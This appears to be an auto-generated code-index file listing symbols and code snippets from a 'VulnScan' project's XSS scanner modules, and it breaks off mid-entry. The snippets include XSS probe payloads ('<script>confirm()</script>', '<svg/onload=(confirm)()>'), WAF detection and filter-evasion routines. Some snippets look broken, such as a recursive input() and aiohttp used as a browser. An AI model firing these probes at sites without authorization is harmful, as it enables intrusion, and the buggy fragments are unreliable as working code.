        "peekOfCode": "fuzz = args.fuzz\nupdate = args.update\ntimeout = args.timeout\nproxy = args.proxy\nrecursive = args.recursive\nargs_file = args.args_file\nargs_seeds = args.args_seeds\nlevel = args.level\nadd_headers = args.add_headers\nthreadCount = args.threadCount",
        "detail": "VulnScan.modules.xss-strike.xsstrike",
        "documentation": {}
    },
    {
        "label": "update",
        "kind": 5,
        "importPath": "VulnScan.modules.xss-strike.xsstrike",
        "description": "VulnScan.modules.xss-strike.xsstrike",
        "peekOfCode": "update = args.update\ntimeout = args.timeout\nproxy = args.proxy\nrecursive = args.recursive\nargs_file = args.args_file\nargs_seeds = args.args_seeds\nlevel = args.level\nadd_headers = args.add_headers\nthreadCount = args.threadCount\ndelay = args.delay",
        "detail": "VulnScan.modules.xss-strike.xsstrike",
        "documentation": {}
    },
    {
        "label": "timeout",
        "kind": 5,
        "importPath": "VulnScan.modules.xss-strike.xsstrike",
        "description": "VulnScan.modules.xss-strike.xsstrike",
        "peekOfCode": "timeout = args.timeout\nproxy = args.proxy\nrecursive = args.recursive\nargs_file = args.args_file\nargs_seeds = args.args_seeds\nlevel = args.level\nadd_headers = args.add_headers\nthreadCount = args.threadCount\ndelay = args.delay\nskip = args.skip",
        "detail": "VulnScan.modules.xss-strike.xsstrike",
        "documentation": {}
    },
    {
        "label": "proxy",
        "kind": 5,
        "importPath": "VulnScan.modules.xss-strike.xsstrike",
        "description": "VulnScan.modules.xss-strike.xsstrike",
        "peekOfCode": "proxy = args.proxy\nrecursive = args.recursive\nargs_file = args.args_file\nargs_seeds = args.args_seeds\nlevel = args.level\nadd_headers = args.add_headers\nthreadCount = args.threadCount\ndelay = args.delay\nskip = args.skip\nskipDOM = args.skipDOM",
        "detail": "VulnScan.modules.xss-strike.xsstrike",
        "documentation": {}
    },
    {
        "label": "recursive",
        "kind": 5,
        "importPath": "VulnScan.modules.xss-strike.xsstrike",
        "description": "VulnScan.modules.xss-strike.xsstrike",
        "peekOfCode": "recursive = args.recursive\nargs_file = args.args_file\nargs_seeds = args.args_seeds\nlevel = args.level\nadd_headers = args.add_headers\nthreadCount = args.threadCount\ndelay = args.delay\nskip = args.skip\nskipDOM = args.skipDOM\nblindXSS = args.blindXSS",
        "detail": "VulnScan.modules.xss-strike.xsstrike",
        "documentation": {}
    },
    {
        "label": "args_file",
        "kind": 5,
        "importPath": "VulnScan.modules.xss-strike.xsstrike",
        "description": "VulnScan.modules.xss-strike.xsstrike",
        "peekOfCode": "args_file = args.args_file\nargs_seeds = args.args_seeds\nlevel = args.level\nadd_headers = args.add_headers\nthreadCount = args.threadCount\ndelay = args.delay\nskip = args.skip\nskipDOM = args.skipDOM\nblindXSS = args.blindXSS\ncore.log.console_log_level = args.console_log_level",
        "detail": "VulnScan.modules.xss-strike.xsstrike",
        "documentation": {}
    },
    {
        "label": "args_seeds",
        "kind": 5,
        "importPath": "VulnScan.modules.xss-strike.xsstrike",
        "description": "VulnScan.modules.xss-strike.xsstrike",
        "peekOfCode": "args_seeds = args.args_seeds\nlevel = args.level\nadd_headers = args.add_headers\nthreadCount = args.threadCount\ndelay = args.delay\nskip = args.skip\nskipDOM = args.skipDOM\nblindXSS = args.blindXSS\ncore.log.console_log_level = args.console_log_level\ncore.log.file_log_level = args.file_log_level",
        "detail": "VulnScan.modules.xss-strike.xsstrike",
        "documentation": {}
    },
    {
        "label": "level",
        "kind": 5,
        "importPath": "VulnScan.modules.xss-strike.xsstrike",
        "description": "VulnScan.modules.xss-strike.xsstrike",
        "peekOfCode": "level = args.level\nadd_headers = args.add_headers\nthreadCount = args.threadCount\ndelay = args.delay\nskip = args.skip\nskipDOM = args.skipDOM\nblindXSS = args.blindXSS\ncore.log.console_log_level = args.console_log_level\ncore.log.file_log_level = args.file_log_level\ncore.log.log_file = args.log_file",
        "detail": "VulnScan.modules.xss-strike.xsstrike",
        "documentation": {}
    },
    {
        "label": "add_headers",
        "kind": 5,
        "importPath": "VulnScan.modules.xss-strike.xsstrike",
        "description": "VulnScan.modules.xss-strike.xsstrike",
        "peekOfCode": "add_headers = args.add_headers\nthreadCount = args.threadCount\ndelay = args.delay\nskip = args.skip\nskipDOM = args.skipDOM\nblindXSS = args.blindXSS\ncore.log.console_log_level = args.console_log_level\ncore.log.file_log_level = args.file_log_level\ncore.log.log_file = args.log_file\nlogger = core.log.setup_logger()",
        "detail": "VulnScan.modules.xss-strike.xsstrike",
        "documentation": {}
    },
    {
        "label": "threadCount",
        "kind": 5,
        "importPath": "VulnScan.modules.xss-strike.xsstrike",
        "description": "VulnScan.modules.xss-strike.xsstrike",
        "peekOfCode": "threadCount = args.threadCount\ndelay = args.delay\nskip = args.skip\nskipDOM = args.skipDOM\nblindXSS = args.blindXSS\ncore.log.console_log_level = args.console_log_level\ncore.log.file_log_level = args.file_log_level\ncore.log.log_file = args.log_file\nlogger = core.log.setup_logger()\ncore.config.globalVariables = vars(args)",
        "detail": "VulnScan.modules.xss-strike.xsstrike",
        "documentation": {}
    },
    {
        "label": "delay",
        "kind": 5,
        "importPath": "VulnScan.modules.xss-strike.xsstrike",
        "description": "VulnScan.modules.xss-strike.xsstrike",
        "peekOfCode": "delay = args.delay\nskip = args.skip\nskipDOM = args.skipDOM\nblindXSS = args.blindXSS\ncore.log.console_log_level = args.console_log_level\ncore.log.file_log_level = args.file_log_level\ncore.log.log_file = args.log_file\nlogger = core.log.setup_logger()\ncore.config.globalVariables = vars(args)\n# Import everything else required from core lib",
        "detail": "VulnScan.modules.xss-strike.xsstrike",
        "documentation": {}
    },
    {
        "label": "skip",
        "kind": 5,
        "importPath": "VulnScan.modules.xss-strike.xsstrike",
        "description": "VulnScan.modules.xss-strike.xsstrike",
        "peekOfCode": "skip = args.skip\nskipDOM = args.skipDOM\nblindXSS = args.blindXSS\ncore.log.console_log_level = args.console_log_level\ncore.log.file_log_level = args.file_log_level\ncore.log.log_file = args.log_file\nlogger = core.log.setup_logger()\ncore.config.globalVariables = vars(args)\n# Import everything else required from core lib\nif type(args.add_headers) == bool:",
        "detail": "VulnScan.modules.xss-strike.xsstrike",
        "documentation": {}
    },
    {
        "label": "skipDOM",
        "kind": 5,
        "importPath": "VulnScan.modules.xss-strike.xsstrike",
        "description": "VulnScan.modules.xss-strike.xsstrike",
        "peekOfCode": "skipDOM = args.skipDOM\nblindXSS = args.blindXSS\ncore.log.console_log_level = args.console_log_level\ncore.log.file_log_level = args.file_log_level\ncore.log.log_file = args.log_file\nlogger = core.log.setup_logger()\ncore.config.globalVariables = vars(args)\n# Import everything else required from core lib\nif type(args.add_headers) == bool:\n    headers = extractHeaders(prompt())",
        "detail": "VulnScan.modules.xss-strike.xsstrike",
        "documentation": {}
    },
    {
        "label": "blindXSS",
        "kind": 5,
        "importPath": "VulnScan.modules.xss-strike.xsstrike",
        "description": "VulnScan.modules.xss-strike.xsstrike",
        "peekOfCode": "blindXSS = args.blindXSS\ncore.log.console_log_level = args.console_log_level\ncore.log.file_log_level = args.file_log_level\ncore.log.log_file = args.log_file\nlogger = core.log.setup_logger()\ncore.config.globalVariables = vars(args)\n# Import everything else required from core lib\nif type(args.add_headers) == bool:\n    headers = extractHeaders(prompt())\nelif type(args.add_headers) == str:",
        "detail": "VulnScan.modules.xss-strike.xsstrike",
        "documentation": {}
    },
    {
        "label": "core.log.console_log_level",
        "kind": 5,
        "importPath": "VulnScan.modules.xss-strike.xsstrike",
        "description": "VulnScan.modules.xss-strike.xsstrike",
        "peekOfCode": "core.log.console_log_level = args.console_log_level\ncore.log.file_log_level = args.file_log_level\ncore.log.log_file = args.log_file\nlogger = core.log.setup_logger()\ncore.config.globalVariables = vars(args)\n# Import everything else required from core lib\nif type(args.add_headers) == bool:\n    headers = extractHeaders(prompt())\nelif type(args.add_headers) == str:\n    headers = extractHeaders(args.add_headers)",
        "detail": "VulnScan.modules.xss-strike.xsstrike",
        "documentation": {}
    },
    {
        "label": "core.log.file_log_level",
        "kind": 5,
        "importPath": "VulnScan.modules.xss-strike.xsstrike",
        "description": "VulnScan.modules.xss-strike.xsstrike",
        "peekOfCode": "core.log.file_log_level = args.file_log_level\ncore.log.log_file = args.log_file\nlogger = core.log.setup_logger()\ncore.config.globalVariables = vars(args)\n# Import everything else required from core lib\nif type(args.add_headers) == bool:\n    headers = extractHeaders(prompt())\nelif type(args.add_headers) == str:\n    headers = extractHeaders(args.add_headers)\nelse:",
        "detail": "VulnScan.modules.xss-strike.xsstrike",
        "documentation": {}
    },
    {
        "label": "core.log.log_file",
        "kind": 5,
        "importPath": "VulnScan.modules.xss-strike.xsstrike",
        "description": "VulnScan.modules.xss-strike.xsstrike",
        "peekOfCode": "core.log.log_file = args.log_file\nlogger = core.log.setup_logger()\ncore.config.globalVariables = vars(args)\n# Import everything else required from core lib\nif type(args.add_headers) == bool:\n    headers = extractHeaders(prompt())\nelif type(args.add_headers) == str:\n    headers = extractHeaders(args.add_headers)\nelse:\n    from core.config import headers",
        "detail": "VulnScan.modules.xss-strike.xsstrike",
        "documentation": {}
    },
    {
        "label": "logger",
        "kind": 5,
        "importPath": "VulnScan.modules.xss-strike.xsstrike",
        "description": "VulnScan.modules.xss-strike.xsstrike",
        "peekOfCode": "logger = core.log.setup_logger()\ncore.config.globalVariables = vars(args)\n# Import everything else required from core lib\nif type(args.add_headers) == bool:\n    headers = extractHeaders(prompt())\nelif type(args.add_headers) == str:\n    headers = extractHeaders(args.add_headers)\nelse:\n    from core.config import headers\ncore.config.globalVariables['headers'] = headers",
        "detail": "VulnScan.modules.xss-strike.xsstrike",
        "documentation": {}
    },
    {
        "label": "core.config.globalVariables",
        "kind": 5,
        "importPath": "VulnScan.modules.xss-strike.xsstrike",
        "description": "VulnScan.modules.xss-strike.xsstrike",
        "peekOfCode": "core.config.globalVariables = vars(args)\n# Import everything else required from core lib\nif type(args.add_headers) == bool:\n    headers = extractHeaders(prompt())\nelif type(args.add_headers) == str:\n    headers = extractHeaders(args.add_headers)\nelse:\n    from core.config import headers\ncore.config.globalVariables['headers'] = headers\ncore.config.globalVariables['checkedScripts'] = set()",
        "detail": "VulnScan.modules.xss-strike.xsstrike",
        "documentation": {}
    },
    {
        "label": "core.config.globalVariables['headers']",
        "kind": 5,
        "importPath": "VulnScan.modules.xss-strike.xsstrike",
        "description": "VulnScan.modules.xss-strike.xsstrike",
        "peekOfCode": "core.config.globalVariables['headers'] = headers\ncore.config.globalVariables['checkedScripts'] = set()\ncore.config.globalVariables['checkedForms'] = {}\ncore.config.globalVariables['definitions'] = json.loads(\n    '\\n'.join(reader(sys.path[0] + '/db/definitions.json')))\nif path:\n    paramData = converter(target, target)\nelif jsonData:\n    headers['Content-type'] = 'application/json'\n    paramData = converter(paramData)",
        "detail": "VulnScan.modules.xss-strike.xsstrike",
        "documentation": {}
    },
    {
        "label": "core.config.globalVariables['checkedScripts']",
        "kind": 5,
        "importPath": "VulnScan.modules.xss-strike.xsstrike",
        "description": "VulnScan.modules.xss-strike.xsstrike",
        "peekOfCode": "core.config.globalVariables['checkedScripts'] = set()\ncore.config.globalVariables['checkedForms'] = {}\ncore.config.globalVariables['definitions'] = json.loads(\n    '\\n'.join(reader(sys.path[0] + '/db/definitions.json')))\nif path:\n    paramData = converter(target, target)\nelif jsonData:\n    headers['Content-type'] = 'application/json'\n    paramData = converter(paramData)\nif args_file:",
        "detail": "VulnScan.modules.xss-strike.xsstrike",
        "documentation": {}
    },
    {
        "label": "core.config.globalVariables['checkedForms']",
        "kind": 5,
        "importPath": "VulnScan.modules.xss-strike.xsstrike",
        "description": "VulnScan.modules.xss-strike.xsstrike",
        "peekOfCode": "core.config.globalVariables['checkedForms'] = {}\ncore.config.globalVariables['definitions'] = json.loads(\n    '\\n'.join(reader(sys.path[0] + '/db/definitions.json')))\nif path:\n    paramData = converter(target, target)\nelif jsonData:\n    headers['Content-type'] = 'application/json'\n    paramData = converter(paramData)\nif args_file:\n    if args_file == 'default':",
        "detail": "VulnScan.modules.xss-strike.xsstrike",
        "documentation": {}
    },
    {
        "label": "core.config.globalVariables['definitions']",
        "kind": 5,
        "importPath": "VulnScan.modules.xss-strike.xsstrike",
        "description": "VulnScan.modules.xss-strike.xsstrike",
        "peekOfCode": "core.config.globalVariables['definitions'] = json.loads(\n    '\\n'.join(reader(sys.path[0] + '/db/definitions.json')))\nif path:\n    paramData = converter(target, target)\nelif jsonData:\n    headers['Content-type'] = 'application/json'\n    paramData = converter(paramData)\nif args_file:\n    if args_file == 'default':\n        payloadList = core.config.payloads",
        "detail": "VulnScan.modules.xss-strike.xsstrike",
        "documentation": {}
    },
    {
        "label": "seedList",
        "kind": 5,
        "importPath": "VulnScan.modules.xss-strike.xsstrike",
        "description": "VulnScan.modules.xss-strike.xsstrike",
        "peekOfCode": "seedList = []\nif args_seeds:\n    seedList = list(filter(None, reader(args_seeds)))\nencoding = base64 if encode and encode == 'base64' else False\nif not proxy:\n    core.config.proxies = {}\nif update:  # if the user has supplied --update argument\n    updater()\n    quit()  # quitting because files have been changed\nif not target and not args_seeds:  # if the user hasn't supplied a url",
        "detail": "VulnScan.modules.xss-strike.xsstrike",
        "documentation": {}
    },
    {
        "label": "encoding",
        "kind": 5,
        "importPath": "VulnScan.modules.xss-strike.xsstrike",
        "description": "VulnScan.modules.xss-strike.xsstrike",
        "peekOfCode": "encoding = base64 if encode and encode == 'base64' else False\nif not proxy:\n    core.config.proxies = {}\nif update:  # if the user has supplied --update argument\n    updater()\n    quit()  # quitting because files have been changed\nif not target and not args_seeds:  # if the user hasn't supplied a url\n    logger.no_format('\\n' + parser.format_help().lower())\n    quit()\nif fuzz:",
        "detail": "VulnScan.modules.xss-strike.xsstrike",
        "documentation": {}
    },
    {
        "label": "MyHTMLParser",
        "kind": 6,
        "importPath": "VulnScan.modules.X-Strike",
        "description": "VulnScan.modules.X-Strike",
        "peekOfCode": "class MyHTMLParser(HTMLParser):\n    def handle_comment(self, data):\n        global OCCURENCE_PARSED\n        if xsschecker.lower() in data.lower():\n            OCCURENCE_PARSED += 1\n            if OCCURENCE_PARSED == OCCURENCE_NUM:\n                raise Exception(\"comment\")\n    def handle_startendtag(self, tag, attrs):\n        global OCCURENCE_PARSED\n        global OCCURENCE_NUM",
        "detail": "VulnScan.modules.X-Strike",
        "documentation": {}
    },
    {
        "label": "WAF_detector",
        "kind": 2,
        "importPath": "VulnScan.modules.X-Strike",
        "description": "VulnScan.modules.X-Strike",
        "peekOfCode": "def WAF_detector(url, param_data, GET, POST):\n    global WAF\n    WAF = False\n    noise = quote_plus(\n        \"<script>confirm()</script>\"\n    )  # a payload which is noisy enough to provoke the WAF\n    fuzz = param_data.replace(\n        xsschecker, noise\n    )  # Replaces xsschecker in param_data with noise\n    try:",
        "detail": "VulnScan.modules.X-Strike",
        "documentation": {}
    },
    {
        "label": "filter_checker",
        "kind": 2,
        "importPath": "VulnScan.modules.X-Strike",
        "description": "VulnScan.modules.X-Strike",
        "peekOfCode": "def filter_checker(url, param_data, GET, POST):\n    strength = \"\"  # A variable for containing strength of the filter\n    # Injecting a malicious payload first by replacing xsschecker with our payload\n    try:\n        low_string = param_data.replace(\n            xsschecker, quote_plus(\"<svg/onload=(confirm)()>\")\n        )\n        # Pausing the program. Default = 0 sec. In case of WAF = 6 sec.\n        sleep(delay)\n        if GET:",
        "detail": "VulnScan.modules.X-Strike",
        "documentation": {}
    },
    {
        "label": "locater",
        "kind": 2,
        "importPath": "VulnScan.modules.X-Strike",
        "description": "VulnScan.modules.X-Strike",
        "peekOfCode": "def locater(url, param_data, GET, POST):\n    # Makes request to the target\n    init_resp = make_request(url, param_data, GET, POST)\n    if xsschecker in init_resp.lower():  # if the xsschecker is found in the response\n        global NUM_REFLECTIONS  # The number of reflections of xsschecker in the response\n        NUM_REFLECTIONS = init_resp.lower().count(\n            xsschecker.lower()\n        )  # Counts number of time d3v got reflected in webpage\n        print(\"%s Number of reflections found: %i\" % (info, NUM_REFLECTIONS))\n        for i in range(NUM_REFLECTIONS):",
        "detail": "VulnScan.modules.X-Strike",
        "documentation": {}
    },
    {
        "label": "scan_occurence",
        "kind": 2,
        "importPath": "VulnScan.modules.X-Strike",
        "description": "VulnScan.modules.X-Strike",
        "peekOfCode": "def scan_occurence(init_resp):\n    # Parses the response to locate the position/context of xsschecker i.e. d3v\n    location = html_parse(init_resp)  # Calling out the parser function\n    if location in (\"script\", \"html_data\", \"start_end_tag_attr\", \"attr\"):\n        occur_number.append(OCCURENCE_NUM)\n        occur_location.append(location)\n    # We are treating the comment context differentally because if a payload is reflected\n    # in comment, it won't execute. So will we test the comment context first\n    elif location == \"comment\":\n        occur_number.insert(",
        "detail": "VulnScan.modules.X-Strike",
        "documentation": {}
    },
    {
        "label": "html_parse",
        "kind": 2,
        "importPath": "VulnScan.modules.X-Strike",
        "description": "VulnScan.modules.X-Strike",
        "peekOfCode": "def html_parse(init_resp):\n    parser = MyHTMLParser()  # initializes the parser\n    location = \"\"  # Variable for containing the location lol\n    try:\n        parser.feed(init_resp)  # submitting the response to the parser\n    except Exception as e:  # Catching the exception/error\n        location = str(\n            e\n        )  # The error is actually the location. For more info, check MyHTMLParser class\n    return location  # Returns the location",
        "detail": "VulnScan.modules.X-Strike",
        "documentation": {}
    },
    {
        "label": "test_param_check",
        "kind": 2,
        "importPath": "VulnScan.modules.X-Strike",
        "description": "VulnScan.modules.X-Strike",
        "peekOfCode": "def test_param_check(\n    payload_to_check,\n    payload_to_compare,\n    OCCURENCE_NUM,\n    url,\n    param_data,\n    GET,\n    POST,\n    action,\n):",
        "detail": "VulnScan.modules.X-Strike",
        "documentation": {}
    },
    {
        "label": "make_request",
        "kind": 2,
        "importPath": "VulnScan.modules.X-Strike",
        "description": "VulnScan.modules.X-Strike",
        "peekOfCode": "def make_request(\n    url, param_data, GET, POST\n):  # The main function which actually makes contact with the target\n    # Pausing the program. Default = 0 sec. In case of WAF = 6 sec.\n    sleep(delay)\n    try:\n        if GET:\n            resp = br.open(url + param_data)  # Makes request\n            return resp.read()  # Reads the output\n        elif POST:",
        "detail": "VulnScan.modules.X-Strike",
        "documentation": {}
    },
    {
        "label": "which_quote",
        "kind": 2,
        "importPath": "VulnScan.modules.X-Strike",
        "description": "VulnScan.modules.X-Strike",
        "peekOfCode": "def which_quote(OCCURENCE_NUM, url, param_data, GET, POST):\n    check_string = \"XSSSTART\" + \"d3v\" + \"XSSEND\"\n    compare_string = \"XSSSTART\" + \"d3v\" + \"XSSEND\"\n    param_data_injected = param_data.replace(xsschecker, check_string)\n    try:\n        check_response = make_request(url, param_data_injected, GET, POST)\n    except:\n        check_response = \"\"\n    quote = \"\"\n    occurence_counter = 0",
        "detail": "VulnScan.modules.X-Strike",
        "documentation": {}
    },
    {
        "label": "paramfinder",
        "kind": 2,
        "importPath": "VulnScan.modules.X-Strike",
        "description": "VulnScan.modules.X-Strike",
        "peekOfCode": "def paramfinder(url, GET, POST):\n    response = br.open(url).read()\n    matches = re.findall(\n        r'<input[^<]*name=\\'[^<]*\\'*>|<input[^<]*name=\"[^<]*\"*>', response\n    )\n    for match in matches:\n        try:\n            found_param = (\n                match.encode(\"utf-8\")\n                .split(\"name=\")[1]",
        "detail": "VulnScan.modules.X-Strike",
        "documentation": {}
    },
    {
        "label": "inject",
        "kind": 2,
        "importPath": "VulnScan.modules.X-Strike",
        "description": "VulnScan.modules.X-Strike",
        "peekOfCode": "def inject(url, param_data, GET, POST):\n    special = \"\"\n    l_filling = \"\"\n    e_fillings = [\n        \"%0a\",\n        \"%09\",\n        \"%0d\",\n        \"+\",\n    ]  # \"Things\" to use between event handler and = or between function and =\n    # \"Things\" to use instead of space",
        "detail": "VulnScan.modules.X-Strike",
        "documentation": {}
    },
    {
        "label": "param_parser",
        "kind": 2,
        "importPath": "VulnScan.modules.X-Strike",
        "description": "VulnScan.modules.X-Strike",
        "peekOfCode": "def param_parser(target, param_data, GET, POST):\n    global url\n    if POST:\n        target = target + \"?\" + param_data\n    parsed_url = urlparse(target)\n    url = parsed_url.scheme + \"://\" + parsed_url.netloc + parsed_url.path\n    parameters = parse_qs(parsed_url.query, keep_blank_values=True)\n    for para in parameters:\n        for i in parameters[para]:\n            paranames.append(para)",
        "detail": "VulnScan.modules.X-Strike",
        "documentation": {}
    },
    {
        "label": "initiator",
        "kind": 2,
        "importPath": "VulnScan.modules.X-Strike",
        "description": "VulnScan.modules.X-Strike",
        "peekOfCode": "def initiator(url, GET, POST):\n    choice = input(\n        \"%s Would you like to look for hidden parameters? [y/N] \" % que)\n    if choice == \"y\":\n        paramfinder(url, GET, POST)\n    if len(paranames) == 0:\n        print(\"%s No parameters to test.\" % bad)\n        quit()\n    else:\n        if GET:",
        "detail": "VulnScan.modules.X-Strike",
        "documentation": {}
    },
    {
        "label": "input",
        "kind": 2,
        "importPath": "VulnScan.modules.X-Strike",
        "description": "VulnScan.modules.X-Strike",
        "peekOfCode": "def input():\n    target = input(\"%s Enter a url: \" % que)\n    if \"http\" in target:  # if the target has http in it, do nothing\n        pass\n    else:\n        try:\n            br.open(\n                \"http://%s\" % target\n            )  # Makes request to the target with http schema\n            target = \"http://%s\" % target",
        "detail": "VulnScan.modules.X-Strike",
        "documentation": {}
    },
    {
        "label": "br",
        "kind": 5,
        "importPath": "VulnScan.modules.X-Strike",
        "description": "VulnScan.modules.X-Strike",
        "peekOfCode": "br = aiohttp\n# Just some colors and shit\nwhite = \"\\033[1;97m\"\ngreen = \"\\033[1;32m\"\nred = \"\\033[1;31m\"\nyellow = \"\\033[1;33m\"\nend = \"\\033[1;m\"\ninfo = \"\\033[1;33m[!]\\033[1;m\"\nque = \"\\033[1;34m[?]\\033[1;m\"\nbad = \"\\033[1;31m[-]\\033[1;m\"",
        "detail": "VulnScan.modules.X-Strike",
        "documentation": {}
    },
    {
        "label": "white",
        "kind": 5,
        "importPath": "VulnScan.modules.X-Strike",
        "description": "VulnScan.modules.X-Strike",
        "peekOfCode": "white = \"\\033[1;97m\"\ngreen = \"\\033[1;32m\"\nred = \"\\033[1;31m\"\nyellow = \"\\033[1;33m\"\nend = \"\\033[1;m\"\ninfo = \"\\033[1;33m[!]\\033[1;m\"\nque = \"\\033[1;34m[?]\\033[1;m\"\nbad = \"\\033[1;31m[-]\\033[1;m\"\ngood = \"\\033[1;32m[+]\\033[1;m\"\nrun = \"\\033[1;97m[~]\\033[1;m\"",
        "detail": "VulnScan.modules.X-Strike",
        "documentation": {}
    },
    {
        "label": "green",
        "kind": 5,
        "importPath": "VulnScan.modules.X-Strike",
        "description": "VulnScan.modules.X-Strike",
        "peekOfCode": "green = \"\\033[1;32m\"\nred = \"\\033[1;31m\"\nyellow = \"\\033[1;33m\"\nend = \"\\033[1;m\"\ninfo = \"\\033[1;33m[!]\\033[1;m\"\nque = \"\\033[1;34m[?]\\033[1;m\"\nbad = \"\\033[1;31m[-]\\033[1;m\"\ngood = \"\\033[1;32m[+]\\033[1;m\"\nrun = \"\\033[1;97m[~]\\033[1;m\"\nxsschecker = \"d3v\"  # A non malicious string to check for reflections and stuff",
        "detail": "VulnScan.modules.X-Strike",
        "documentation": {}
    },
    {
        "label": "red",
        "kind": 5,
        "importPath": "VulnScan.modules.X-Strike",
        "description": "VulnScan.modules.X-Strike",
        "peekOfCode": "red = \"\\033[1;31m\"\nyellow = \"\\033[1;33m\"\nend = \"\\033[1;m\"\ninfo = \"\\033[1;33m[!]\\033[1;m\"\nque = \"\\033[1;34m[?]\\033[1;m\"\nbad = \"\\033[1;31m[-]\\033[1;m\"\ngood = \"\\033[1;32m[+]\\033[1;m\"\nrun = \"\\033[1;97m[~]\\033[1;m\"\nxsschecker = \"d3v\"  # A non malicious string to check for reflections and stuff\nparanames = []  # list for storing parameter names",
        "detail": "VulnScan.modules.X-Strike",
        "documentation": {}
    },
    {
        "label": "yellow",
        "kind": 5,
        "importPath": "VulnScan.modules.X-Strike",
        "description": "VulnScan.modules.X-Strike",
        "peekOfCode": "yellow = \"\\033[1;33m\"\nend = \"\\033[1;m\"\ninfo = \"\\033[1;33m[!]\\033[1;m\"\nque = \"\\033[1;34m[?]\\033[1;m\"\nbad = \"\\033[1;31m[-]\\033[1;m\"\ngood = \"\\033[1;32m[+]\\033[1;m\"\nrun = \"\\033[1;97m[~]\\033[1;m\"\nxsschecker = \"d3v\"  # A non malicious string to check for reflections and stuff\nparanames = []  # list for storing parameter names\nparavalues = []  # list for storing parameter values",
        "detail": "VulnScan.modules.X-Strike",
        "documentation": {}
    },
    {
        "label": "end",
        "kind": 5,
        "importPath": "VulnScan.modules.X-Strike",
        "description": "VulnScan.modules.X-Strike",
        "peekOfCode": "end = \"\\033[1;m\"\ninfo = \"\\033[1;33m[!]\\033[1;m\"\nque = \"\\033[1;34m[?]\\033[1;m\"\nbad = \"\\033[1;31m[-]\\033[1;m\"\ngood = \"\\033[1;32m[+]\\033[1;m\"\nrun = \"\\033[1;97m[~]\\033[1;m\"\nxsschecker = \"d3v\"  # A non malicious string to check for reflections and stuff\nparanames = []  # list for storing parameter names\nparavalues = []  # list for storing parameter values\nCURRENTLY_OPEN_TAGS = []  # Used by HTML parser",
        "detail": "VulnScan.modules.X-Strike",
        "documentation": {}
    },
    {
        "label": "info",
        "kind": 5,
        "importPath": "VulnScan.modules.X-Strike",
        "description": "VulnScan.modules.X-Strike",
        "peekOfCode": "info = \"\\033[1;33m[!]\\033[1;m\"\nque = \"\\033[1;34m[?]\\033[1;m\"\nbad = \"\\033[1;31m[-]\\033[1;m\"\ngood = \"\\033[1;32m[+]\\033[1;m\"\nrun = \"\\033[1;97m[~]\\033[1;m\"\nxsschecker = \"d3v\"  # A non malicious string to check for reflections and stuff\nparanames = []  # list for storing parameter names\nparavalues = []  # list for storing parameter values\nCURRENTLY_OPEN_TAGS = []  # Used by HTML parser\nOPEN_EMPTY_TAG = (",
        "detail": "VulnScan.modules.X-Strike",
        "documentation": {}
    },
    {
        "label": "que",
        "kind": 5,
        "importPath": "VulnScan.modules.X-Strike",
        "description": "VulnScan.modules.X-Strike",
        "peekOfCode": "que = \"\\033[1;34m[?]\\033[1;m\"\nbad = \"\\033[1;31m[-]\\033[1;m\"\ngood = \"\\033[1;32m[+]\\033[1;m\"\nrun = \"\\033[1;97m[~]\\033[1;m\"\nxsschecker = \"d3v\"  # A non malicious string to check for reflections and stuff\nparanames = []  # list for storing parameter names\nparavalues = []  # list for storing parameter values\nCURRENTLY_OPEN_TAGS = []  # Used by HTML parser\nOPEN_EMPTY_TAG = (\n    \"\"  # to store context i.e. <input attr=$reflection> then input will be open tag",
        "detail": "VulnScan.modules.X-Strike",
        "documentation": {}
    },
    {
        "label": "bad",
        "kind": 5,
        "importPath": "VulnScan.modules.X-Strike",
        "description": "VulnScan.modules.X-Strike",
        "peekOfCode": "bad = \"\\033[1;31m[-]\\033[1;m\"\ngood = \"\\033[1;32m[+]\\033[1;m\"\nrun = \"\\033[1;97m[~]\\033[1;m\"\nxsschecker = \"d3v\"  # A non malicious string to check for reflections and stuff\nparanames = []  # list for storing parameter names\nparavalues = []  # list for storing parameter values\nCURRENTLY_OPEN_TAGS = []  # Used by HTML parser\nOPEN_EMPTY_TAG = (\n    \"\"  # to store context i.e. <input attr=$reflection> then input will be open tag\n)",
        "detail": "VulnScan.modules.X-Strike",
        "documentation": {}
    },
    {
        "label": "good",
        "kind": 5,
        "importPath": "VulnScan.modules.X-Strike",
        "description": "VulnScan.modules.X-Strike",
        "peekOfCode": "good = \"\\033[1;32m[+]\\033[1;m\"\nrun = \"\\033[1;97m[~]\\033[1;m\"\nxsschecker = \"d3v\"  # A non malicious string to check for reflections and stuff\nparanames = []  # list for storing parameter names\nparavalues = []  # list for storing parameter values\nCURRENTLY_OPEN_TAGS = []  # Used by HTML parser\nOPEN_EMPTY_TAG = (\n    \"\"  # to store context i.e. <input attr=$reflection> then input will be open tag\n)\nblacklist = [",
        "detail": "VulnScan.modules.X-Strike",
        "documentation": {}
    },
    {
        "label": "run",
        "kind": 5,
        "importPath": "VulnScan.modules.X-Strike",
        "description": "VulnScan.modules.X-Strike",
        "peekOfCode": "run = \"\\033[1;97m[~]\\033[1;m\"\nxsschecker = \"d3v\"  # A non malicious string to check for reflections and stuff\nparanames = []  # list for storing parameter names\nparavalues = []  # list for storing parameter values\nCURRENTLY_OPEN_TAGS = []  # Used by HTML parser\nOPEN_EMPTY_TAG = (\n    \"\"  # to store context i.e. <input attr=$reflection> then input will be open tag\n)\nblacklist = [\n    \"html\",",
        "detail": "VulnScan.modules.X-Strike",
        "documentation": {}
    },
    {
        "label": "xsschecker",
        "kind": 5,
        "importPath": "VulnScan.modules.X-Strike",
        "description": "VulnScan.modules.X-Strike",
        "peekOfCode": "xsschecker = \"d3v\"  # A non malicious string to check for reflections and stuff\nparanames = []  # list for storing parameter names\nparavalues = []  # list for storing parameter values\nCURRENTLY_OPEN_TAGS = []  # Used by HTML parser\nOPEN_EMPTY_TAG = (\n    \"\"  # to store context i.e. <input attr=$reflection> then input will be open tag\n)\nblacklist = [\n    \"html\",\n    \"body\",",
        "detail": "VulnScan.modules.X-Strike",
        "documentation": {}
    },
    {
        "label": "paranames",
        "kind": 5,
        "importPath": "VulnScan.modules.X-Strike",
        "description": "VulnScan.modules.X-Strike",
        "peekOfCode": "paranames = []  # list for storing parameter names\nparavalues = []  # list for storing parameter values\nCURRENTLY_OPEN_TAGS = []  # Used by HTML parser\nOPEN_EMPTY_TAG = (\n    \"\"  # to store context i.e. <input attr=$reflection> then input will be open tag\n)\nblacklist = [\n    \"html\",\n    \"body\",\n    \"br\",",
        "detail": "VulnScan.modules.X-Strike",
        "documentation": {}
    },
    {
        "label": "paravalues",
        "kind": 5,
        "importPath": "VulnScan.modules.X-Strike",
